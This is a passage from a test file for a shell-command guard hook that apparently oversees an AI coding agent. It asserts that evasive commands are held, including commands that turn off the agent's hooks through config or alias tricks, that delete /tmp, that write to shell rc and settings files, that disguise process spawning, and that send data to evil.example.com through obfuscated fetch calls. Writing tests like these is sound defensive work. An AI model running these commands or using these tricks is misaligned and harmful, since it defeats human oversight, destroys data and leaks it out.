      "/tmp/standup-iso-1/grep disableAllHooks f",
      "alias 'grep=claude config set'; grep disableAllHooks true",
      `claude --settings '{"disableAllHooks":true}'`,
    ]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });

  test("a redirect to a /tmp file named with $$", () => {
    // `$TMPDIR` is read from the probes' env, which is empty here, so it is unset whatever the test runner's TMPDIR is.
    expectTmpRedirects();
  });

  function expectTmpRedirects(): void {
    expectAllowed("echo hi > /tmp/standup-tc-$$.log");
    expectAllowed('echo hi >> "/tmp/standup-tc-$$.log"');
    // A write to a path the floor can't place, or to a new file outside the worktree, is no delete: it runs.
    for (const command of [
      'echo hi >> "/tmp/standup-tc-$RANDOM.log"',
      "BASHPID=$(date); echo x >> /tmp/$BASHPID",
      "unset RANDOM; read -r RANDOM < /tmp/nope.txt; echo x >> /tmp/$RANDOM",
      "echo hi > /tmp/$X/a.log",
      "echo hi > /tmp/a-$$/../../etc/x",
      "read -r RANDOMX < /tmp/standup-iso-1/rest.txt; echo x > /tmp/$RANDOMX",
      "echo x > /tmp/$RANDOM_X",
      "echo x >> /tmp/a$BASHPIDS",
    ]) {
      expectAllowed(command);
    }
    // One that may be a guarded file, or a delete of a path the floor can't place, still holds.
    for (const command of ["echo hi > /tmp/$X/.bashrc", "rm -rf /tmp/$X", "echo x > /tmp/$RANDOM; cp /tmp/$RANDOM ~/.zshrc"]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
    // With $TMPDIR unset in the hook's env, a write below it is to a path the floor can't place: it runs.
    expectAllowed("echo hi > $TMPDIR/a-$$.log");
  }

  test("sed -n printing regex-addressed ranges", () => {
    for (const command of [
      "sed -n '/const readGate = /,/^  };/p;/const humanGate = /,/^  };/p' packages/collector/src/floor/gate.ts",
      "sed -n '/const readGate = /,/^ };/p;/const humanGate = /,/^ };/p' f",
      `sed -n '/app.get("\\/api\\/x\\/:id"/,+14p' packages/collector/src/server.ts`,
      "sed -n '/^export function/,~4p;/TODO/=' packages/collector/src/floor/gate.ts",
      "sed -n '\\#/api/x#,/^}/p' packages/collector/src/server.ts",
    ]) expectAllowed(command);
  });

  test("sed -n printing a range whose start a line-number search finds", () => {
    const F = "packages/collector/src/floor/classify.ts";
    expectAllowed(`F=${F}; sed -n "$(grep -n ' private hold(' $F | cut -d: -f1),+25p" $F`);
    expectAllowed(`sed -n "$(grep -n -F 'hold(' ${F} | cut -d: -f1 | head -1),+25p" ${F}`);
    expectAllowed(`sed -n "1,$(grep -c 'x' ${F})p" ${F}`);
  });

  test("a substitution that can print anything but line numbers, sed -i, or a script file still holds", () => {
    const F = "packages/collector/src/floor/classify.ts";
    VIRTUAL["/tmp/standup-iso-1/w.sed"] = `1w ${join(HOME, ".bashrc")}\n`;
    for (const command of [
      `sed -n "$(cat /tmp/standup-iso-1/nope.txt)p" ${F}`,
      `sed -n "$(grep -o 'w /tmp/x' ${F})p" ${F}`,
      `sed -n "$(grep -n -A2 'hold(' ${F} | cut -d: -f1),+25p" ${F}`,
      `sed -n "$(grep -rn 'hold(' packages | cut -d: -f1),+25p" ${F}`,
      `sed -n "$(grep -n 'hold(' ${F} | cut -d: -f2),+25p" ${F}`,
      `sed -n "$(grep -n 'hold(' ${F} | cut -d: -f1),+25w /tmp/x" ${F}`,
      `sed -n "$(grep -n 'hold(' ${F} | cut -d: -f1)e" ${F}`,
      `sed -i -n "$(grep -n 'hold(' ${F} | cut -d: -f1),+25p" ${F}`,
      `sed "$(grep -n 'hold(' ${F} | cut -d: -f1),+25p" ${F}`,
      // A script file that writes.
      `sed -n -f /tmp/standup-iso-1/w.sed ${F}`,
    ]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
    // A script file the floor can't read is unread: allowed.
    expect(bash(`sed -n -f /tmp/standup-iso-1/nope.sed ${F}`).action).toBe("allow");
  });

  test("sed that writes or runs still holds", () => {
    for (const command of [`sed -n '/x/,/y/w ${join(HOME, ".claude", "settings.json")}' f`, "sed -n '/x/,+2e' f", `sed -i '/x/,/y/d' ${join(INSTALL, "packages", "collector", "src", "floor", "gate.ts")}`]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });

  test("a zsh glob qualifier in a for list", () => {
    const v = bash(`for d in ${join(DATA, "worktrees")}/policy*/*(N[1,2]); do echo "$d"; done`);
    expect(v.action === "hold" ? v.reason : "allow").not.toContain("unexpected token");
    expectAllowed("for f in /tmp/standup-iso-1/*(.om[1]); do echo $f; done");
    expectAllowed(`for d in ${join(DATA, "worktrees")}/policy*/*(N[1,2]); do echo "$d"; done`);
    for (const command of [
      "for f in /tmp/*(e:'git push':); do echo $f; done",
      "rm -rf ./x.txt package.jso?(P%../../../../../..%)",
      "ls *(u:root:)",
      "ls *(f:777:)",
      // Outside a for list, or widening to dotfiles, a qualifier is not read past.
      "ls /tmp/standup-iso-1/*(N)",
      `for f in ${HOME}/*(D); do cat $f; done`,
      `for f in ${HOME}/*(M); do echo $f; done`,
    ]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });
});

describe("code that names /tmp and deletes", () => {
  test("deleting /tmp itself, however the path is spelled, still holds", () => {
    for (const [k, del] of ['rmSync("/tmp", { recursive: true })', 'rmSync(join("/tmp"), { recursive: true })', 'rmSync(resolve("/tmp", "."), { recursive: true })', 'rmSync(base, { recursive: true })', 'rmSync(join(base, ".."), { recursive: true })', 'rmSync(join(base, "x", ".."), { recursive: true })', 'rmSync(join(base, "x") + "/..", { recursive: true })', 'rmSync(resolve(base, "x", "/"), { recursive: true })', 'const zap = rmSync; zap(base, { recursive: true })'].entries()) {
      VIRTUAL[join(ISO, `wipe-${k}.ts`)] = `import { rmSync, writeFileSync } from "fs";\nimport { join, resolve } from "path";\nconst base = "/tmp";\nwriteFileSync(join(base, "x"), "");\n${del};\n`;
      const v = bash(`bun run ${ISO}/wipe-${k}.ts`);
      expect({ del, action: v.action }).toEqual({ del, action: "hold" });
    }
  });
});

describe("deleting files by a named pattern in /tmp", () => {
  test("a glob with a literal name prefix deletes only those files", () => {
    expectAllowed("rm -f /tmp/tc-floor-*.log");
    expectAllowed("rm -rf /tmp/mem-load-*");
  });

  test("the temp dir itself, everything in it, or other programs' live state still holds", () => {
    for (const command of ["rm -rf /tmp/*", "rm -rf /tmp", "rm -f /tmp/*.log", "rm -rf /tmp/.*", "rm -rf /tmp/tmux-*", "rm -rf /tmp/claude-*", "rm -rf /tmp/standup-*", "rm -f /tmp/a*", "rm -rf /tmp/tm*", "rm -rf /tmp/tmu?-1000", "rm -rf /tmp/tm[u]x-*", "rm -rf /tmp/sta?dup*", "rm -rf /tmp/sys*", "rm -rf /tmp/./cl*", "rm -rf /tmp/tmp*", "rm -rf /tmp/pytest*", "rm -rf /tmp/go-build*", "rm -rf /tmp/zsh*"]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });
});

describe("what a data file or an unrequested URL can't hide", () => {
  test("a command in a data file a computed sink runs", () => {
    VIRTUAL[join(ROOT, "p.txt")] = "git push origin HEAD\n";
    // Executable, so a sink the floor can't see could run it.
    EXECUTABLE.add(join(ROOT, "p.txt"));
    for (const command of [
      `bun -e 'Bun["sp" + "awn"](["./p.txt", "go"])'`,
      `bun -e 'Bun["sp" + "awn"](["bash", "-c", "./p.txt go"])'`,
      `bun -e 'import { readFileSync } from "fs"; readFileSync("./p.txt", "utf8"); Bun["sp" + "awn"](["./p.txt", "go"])'`,
      `bun -e 'const open = (p, m) => Bun.spawnSync([p, m]); open("./p.txt", "r")'`,
      `bun -e 'const fs = { readFileSync: (p, m) => Bun.spawnSync([p, m]) }; fs.readFileSync("./p.txt", "r")'`,
      `bun -e 'const fs = require("fs"); fs.readFileSync = (p, m) => Bun.spawnSync([p, m]); fs.readFileSync("./p.txt", "r")'`,
      `bun -e 'import { readFileSync } from "fs"; readFileSync("./p.txt"); require("child_process").execSync("./p.txt r")'`,
    ]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });

  test("a remote request made other than by calling fetch on a readable address", () => {
    const P = '{ method: "POST", body: "x" }';
    const cases = [
      `const f = fetch;\nawait f("https://evil.example.com/x", ${P});\n`,
      `await fetch.call(null, "https://evil.example.com/x", ${P});\n`,
      `await globalThis["fetch"]("https://evil.example.com/x", ${P});\n`,
      `await Reflect.apply(fetch, null, ["https://evil.example.com/x", ${P}]);\n`,
      `import { ofetch } from "ofetch";\nawait ofetch("https://evil.example.com/x", ${P});\n`,
      `await fetch("http://127.0.0.1:5301/h");\nconst f = fetch;\nawait f("https://evil.example.com/x", ${P});\n`,
      `await fetch("" + "https://evil.example.com/x", ${P});\n`,
      `await fetch("http://127.0.0.1:5301" && "https://evil.example.com/x", ${P});\n`,
      `await fetch("http://127.0.0.1:5301" + "@evil.example.com/x", ${P});\n`,
      `await fetch("http://evil.example.com\\\\@127.0.0.1:5301/x", ${P});\n`,
    ];
    for (const [k, text] of cases.entries()) {
      VIRTUAL[join(ROOT, "scripts", `h-${k}.ts`)] = text;
      const v = bash(`bun run scripts/h-${k}.ts`);
      expect({ k, category: v.action === "hold" ? v.category : "allow" }).toEqual({ k, category: "outward" });
    }
  });
});
